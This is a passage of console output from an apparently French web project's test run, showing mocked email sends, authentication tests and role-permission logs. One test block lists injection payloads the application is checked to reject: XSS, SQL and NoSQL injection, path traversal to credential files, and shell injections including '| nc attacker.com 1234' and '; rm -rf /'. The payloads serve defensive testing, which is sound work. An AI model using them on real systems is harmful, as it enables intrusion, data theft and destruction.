  subject: [32m'Test 2'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBatch Operations[2m > [22m[2mshould send batch emails
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507075-0.43099268903164667'[39m,
  to: [32m'user3@example.com'[39m,
  subject: [32m'Test 3'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBatch Operations[2m > [22m[2mshould batch with custom concurrency
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBatch Operations[2m > [22m[2mshould batch with custom concurrency
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507079-0.48575197236267886'[39m,
  to: [32m'user0@example.com'[39m,
  subject: [32m'Test 0'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}
[MOCK SMTP] {
  messageId: [32m'mock-1772463507079-0.05466057357535847'[39m,
  to: [32m'user1@example.com'[39m,
  subject: [32m'Test 1'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}
[MOCK SMTP] {
  messageId: [32m'mock-1772463507079-0.26996269296886943'[39m,
  to: [32m'user2@example.com'[39m,
  subject: [32m'Test 2'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBatch Operations[2m > [22m[2mshould batch with custom concurrency
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507079-0.5078414431258951'[39m,
  to: [32m'user3@example.com'[39m,
  subject: [32m'Test 3'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}
[MOCK SMTP] {
  messageId: [32m'mock-1772463507079-0.6175334868229134'[39m,
  to: [32m'user4@example.com'[39m,
  subject: [32m'Test 4'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}
[MOCK SMTP] {
  messageId: [32m'mock-1772463507079-0.5537571394020244'[39m,
  to: [32m'user5@example.com'[39m,
  subject: [32m'Test 5'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBatch Operations[2m > [22m[2mshould batch with custom concurrency
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507080-0.16542771158283753'[39m,
  to: [32m'user6@example.com'[39m,
  subject: [32m'Test 6'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}
[MOCK SMTP] {
  messageId: [32m'mock-1772463507080-0.5497396193123958'[39m,
  to: [32m'user7@example.com'[39m,
  subject: [32m'Test 7'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}
[MOCK SMTP] {
  messageId: [32m'mock-1772463507080-0.2924113181541135'[39m,
  to: [32m'user8@example.com'[39m,
  subject: [32m'Test 8'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBatch Operations[2m > [22m[2mshould batch with custom concurrency
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507080-0.25337010935701887'[39m,
  to: [32m'user9@example.com'[39m,
  subject: [32m'Test 9'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBatch Operations[2m > [22m[2mshould handle mixed valid and invalid emails in batch
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBatch Operations[2m > [22m[2mshould handle mixed valid and invalid emails in batch
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507083-0.3893023029358962'[39m,
  to: [32m'valid@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}
[MOCK SMTP] {
  messageId: [32m'mock-1772463507083-0.7905485523315268'[39m,
  to: [32m'another@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mConnection Management[2m > [22m[2mshould verify connection
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mConnection Management[2m > [22m[2mshould close connection
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mConnection Management[2m > [22m[2mshould return config
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mError Handling[2m > [22m[2mshould handle timeout gracefully
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mError Handling[2m > [22m[2mshould handle timeout gracefully
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507094-0.8485755254302574'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mError Handling[2m > [22m[2mshould classify auth errors
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mError Handling[2m > [22m[2mshould classify auth errors
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507096-0.5014171092799098'[39m,
  to: [32m'user@example.com'[39m,
  subject: [32m'Test'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/unit/smtp.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/smtp.test.ts [2m([22m[2m65 tests[22m[2m)[22m[33m 348[2mms[22m[39m
[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mPassword Reset[2m > [22m[2mtoken reset ├á usage unique
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507475-0.5993740064223672'[39m,
  to: [32m'test-bfe0fc98-0546-4a07-ad01-b7bd2f1d2ed3@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mPassword Reset[2m > [22m[2mtoken reset ├á usage unique
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507485-0.8148668830621244'[39m,
  to: [32m'test-bfe0fc98-0546-4a07-ad01-b7bd2f1d2ed3@test.local'[39m,
  subject: [32m'Password reset - R├®initialisation de votre mot de passe'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mPassword Reset[2m > [22m[2mtoken reset ├á usage unique
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463507490-0.5625728163145158'[39m,
  to: [32m'test-bfe0fc98-0546-4a07-ad01-b7bd2f1d2ed3@test.local'[39m,
  subject: [32m'Password reset - R├®initialisation de votre mot de passe'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mPassword Reset[2m > [22m[2mtoken reset ├á usage unique
[22m[39mreset email html <p>Cliquez sur le lien suivant pour r├®initialiser votre mot de passe :</p><p><a href="http://localhost:3000/api/auth/reset-password/3Bnt1jxXlX31hAZPRnYEt97U?callbackURL=">http://localhost:3000/api/auth/reset-password/3Bnt1jxXlX31hAZPRnYEt97U?callbackURL=</a></p>
query match [1mnull[22m
path match [
  [32m'reset-password/3Bnt1jxXlX31hAZPRnYEt97U'[39m,
  [32m'3Bnt1jxXlX31hAZPRnYEt97U'[39m,
  index: [33m117[39m,
  input: [32m'<p>Cliquez sur le lien suivant pour r├®initialiser votre mot de passe :</p><p><a href="http://localhost:3000/api/auth/reset-password/3Bnt1jxXlX31hAZPRnYEt97U?callbackURL=">http://localhost:3000/api/auth/reset-password/3Bnt1jxXlX31hAZPRnYEt97U?callbackURL=</a></p>'[39m,
  groups: [90mundefined[39m
]
extracted token 3Bnt1jxXlX31hAZPRnYEt97U

[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mLogout & Session[2m > [22m[2mlogout invalide token
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463508228-0.16676294330703834'[39m,
  to: [32m'test-e2b38612-535b-4ef9-87a3-aff6a64bbe40@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | tests/integration/loaders/blog-loader.test.ts
[22m[39m[dotenv@17.3.1] injecting env (12) from .env -- tip: ­ƒñû agentic secret storage: https://dotenvx.com/as2

[90mstdout[2m | tests/integration/loaders/blog-loader.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/integration/loaders/blog-loader.test.ts[2m > [22m[2mloadBlogPosts (integration via mocked DB)[2m > [22m[2mlogs error on missing lang key in translation
[22m[39mTranslation object keys: [ [32m'headline'[39m, [32m'articleBody'[39m ]

[90mstdout[2m | tests/integration/loaders/blog-loader.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/integration/loaders/blog-loader.test.ts [2m([22m[2m5 tests[22m[2m)[22m[32m 198[2mms[22m[39m
[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mAudit & Logging[2m > [22m[2mlog cr├®ation utilisateur
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463508916-0.6937354630851589'[39m,
  to: [32m'test-9773d227-0052-452f-a734-666bb6dc3695@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstdout[2m | src/lib/auth/permissions.test.ts
[22m[39m[dotenv@17.3.1] injecting env (12) from .env -- tip: ÔÜÖ´©Å  enable debug logging with { debug: true }

[90mstdout[2m | src/lib/auth/auth.test.ts[2m > [22m[2mAuth - Security & Functionality[2m > [22m[2mAudit & Logging[2m > [22m[2mlog ├®chec connexion
[22m[39m[MOCK SMTP] {
  messageId: [32m'mock-1772463509240-0.8227345823624388'[39m,
  to: [32m'test-90c96527-bfa1-4b70-9731-038a202a1992@test.local'[39m,
  subject: [32m'verify your email address - V├®rifiez votre adresse email'[39m,
  from: [32m'contact@commentcuire.fr'[39m
}

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mAudit & Logging[2m > [22m[2mlog ├®chec 
connexion
[22m[39m[2m2026-03-02T14:58:29.534Z[0m 
[31mERROR[0m [1m[Better Auth]:[0m Invalid password

[90mstderr[2m | src/lib/auth/auth.test.ts[2m > 
[22m[2mAuth - Security & Functionality[2m > 
[22m[2mAudit & Logging[2m > [22m[2mlog ├®chec 
connexion
[22m[39mloginTestUser error: [InternalAPIError: 
Invalid email or password] {
  status: [32m'UNAUTHORIZED'[39m,
  body: {
    code: [32m'INVALID_EMAIL_OR_PASSWORD'[39m,
    message: [32m'Invalid email or password'[39m
  },
  headers: {},
  statusCode: [33m401[39m
}

[90mstdout[2m | src/lib/auth/auth.test.ts
[22m[39m
Ô£à Test suite complete


 [31mÔØ»[39m src/lib/auth/auth.test.ts [2m([22m[2m72 tests[22m[2m | [22m[31m1 failed[39m[2m)[22m[33m 11392[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m cr├®e utilisateur avec password fort [33m 347[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te XSS: <script>alert(1)</script>[32m 35[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te XSS: "<script>alert(1)</script>[32m 7[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te XSS: '-alert(1)-'[32m 7[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te XSS: <img src=x onerror=alert(1)>[32m 7[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te XSS: javascript:alert(1)[32m 7[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te XSS: ${alert(1)}[32m 6[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te XSS: {{constructor.constructor("alert(1)")()}}[32m 6[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te XSS: <iframe src="javascript:alert(1)"></iframe>[32m 7[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te XSS: <body onload=alert(1)>[32m 7[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te XSS: <input onfocus=alert(1) autofocus>[32m 6[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te XSS: <select onfocus=alert(1) autofocus>[32m 6[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te XSS: <textarea onfocus=alert(1) autofocus>[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te XSS: <marquee onstart=alert(1)>[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te XSS: <div style="background:url(javascript:alert(1))">[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te SQL injection: '; DROP TABLE user; --[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te SQL injection: ' OR '1'='1[32m 7[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te SQL injection: '; DELETE FROM user WHERE '1'='1'; --[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te SQL injection: 1'; UPDATE user SET role='admin' WHERE '1'='1[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te SQL injection: ' UNION SELECT * FROM pg_authid --[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te SQL injection: '; COPY (SELECT '') TO PROGRAM 'id'; --[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te SQL injection: admin'--[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te SQL injection: ' or 1=1--[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te SQL injection: ') OR ('1'='1[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te NoSQL injection: {"$ne":null}[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te NoSQL injection: {"$gt":""}[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te NoSQL injection: {"$where":"this.password.length > 0"}[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te NoSQL injection: {"$regex":".*"}[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te NoSQL injection: {"$or":[{}]}[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te NoSQL injection: {"$and":[{"$where":"1==1"}]}[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te path traversal: ../../../etc/passwd[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te path traversal: ..\..\..\windows\system32\config\sam[32m 9[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te path traversal: ....//....//etc/shadow[32m 4[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te path traversal: ..%2f..%2f..%2fetc%2fpasswd[32m 4[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te path traversal: ..%252f..%252fetc%252fpasswd[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te command injection: ; cat /etc/passwd[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te command injection: && whoami[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te command injection: | id[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te command injection: `id`[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te command injection: $(id)[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te command injection: | nc attacker.com 1234[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te command injection: ; rm -rf /[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te null bytes: user @example.com[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te null bytes: test <script>alert(1)</script>[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te null bytes: admin .php[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te unicode spoofing: ´¢ô´¢â´¢Æ´¢ë´¢É´¢ö[32m 11[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te unicode spoofing: ­Øôê­ØÆ©­Øôç­ØÆ¥­Øôà­Øôë[32m 15[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te unicode spoofing: ­Øòñ­Øòö­Øòú­ØòÜ­Øòí­ØòÑ[32m 6[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te email homograph attack[32m 6[2mms[22m[39m
       [32mÔ£ô[39m limite longueur champs[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te password faible: 'common dictionary'[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te password faible: 'sequential'[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te password faible: 'sequential letters'[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te password faible: 'common pattern'[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te password faible: 'keyboard pattern'[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te password faible: 'leet speak common'[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te password faible: 'repetition'[32m 5[2mms[22m[39m
       [32mÔ£ô[39m rej├¿te password faible: 'context predictable'[32m 6[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m hash password diff├®rent pour m├¬me password [33m 624[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m JWT a claims s├®curis├®s [33m 710[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m rej├¿te timing attack (temps similaire) [33m 1883[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m rate limit apr├¿s 5 ├®checs [33m 1990[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m session unique par device [33m 1068[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m envoie email avec token s├®curis├® [33m 303[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m token verification ├á usage unique [33m 554[2mms[22m[39m
[31m       [31m├ù[31m token reset expire[39m[33m 963[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m token reset ├á usage unique [33m 714[2mms[22m[39m
       [32mÔ£ô[39m notification email si password chang├®[32m 5[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m logout invalide token [33m 746[2mms[22m[39m
       [32mÔ£ô[39m session expire apr├¿s inactivit├®[32m 6[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m log cr├®ation utilisateur [33m 329[2mms[22m[39m
       [33m[2mÔ£ô[22m[39m log ├®chec connexion [33m 623[2mms[22m[39m
[90mstdout[2m | src/lib/auth/permissions.test.ts
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | src/lib/auth/permissions.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2madmin -> create_user = true (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2madmin -> delete_user = true (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2madmin -> delete_organization = true (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2madmin -> impersonate_user = true (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2muser -> read_profile = true (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2muser -> update_own_profile = true (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2muser -> delete_user = false (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2muser -> admin_access = false (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2muser -> create_organization = true (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mowner -> manage_organization = true (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mowner -> delete_organization = true (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mowner -> invite_member = true (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mowner -> remove_member = true (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mowner -> admin_access = false (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mmember -> read_organization = true (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mmember -> create_project = true (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mmember -> delete_organization = false (undefined)
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mABAC - Attribute Based[2m > [22m[2mowner: ressource own vs other
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mABAC - Attribute Based[2m > [22m[2mowner: ressource own vs other
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mABAC - Attribute Based[2m > [22m[2mowner: ressource own vs other
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mABAC - Attribute Based[2m > [22m[2mmember: acc├¿s projet org uniquement
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mABAC - Attribute Based[2m > [22m[2mmember: acc├¿s projet org uniquement
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mABAC - Attribute Based[2m > [22m[2mtime-based restrictions
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mABAC - Attribute Based[2m > [22m[2mtime-based restrictions
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mABAC - Attribute Based[2m > [22m[2mIP-based restrictions
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
  [32m'moderator'[39m,
  [32m'admin'[39m
]

[90mstdout[2m | src/lib/auth/permissions.test.ts[2m > [22m[2mRBAC/ABAC Security[2m > [22m[2mABAC - Attribute Based[2m > [22m[2mIP-based restrictions
[22m[39m[RBAC] configured roles: [
  [32m'citizen'[39m,
  [32m'owner'[39m,
  [32m'author'[39m,
  [32m'mediator'[39m,
  [32m'educator'[39m,
